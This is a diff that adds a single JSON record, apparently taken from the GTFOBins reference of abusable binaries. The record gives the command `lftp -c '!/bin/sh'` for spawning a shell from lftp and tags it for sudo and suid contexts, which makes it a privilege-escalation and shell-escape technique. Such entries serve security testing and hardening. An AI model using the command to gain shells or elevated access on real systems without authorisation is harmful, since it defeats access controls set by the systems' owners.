@@ -1,0 +1,1 @@
+{"title": "lftp", "source": "gtfobins", "source_label": "GTFOBins", "path": "lftp", "html": "<h1>lftp</h1>\n<h2>Shell</h2>\n<pre><code class=\"language-bash\">lftp -c &#x27;!/bin/sh&#x27;</code></pre>", "excerpt": "lftp Shell lftp -c &#x27;!/bin/sh&#x27;", "tags": ["func:shell", "ctx:sudo", "ctx:suid", "ctx:unprivileged"]}
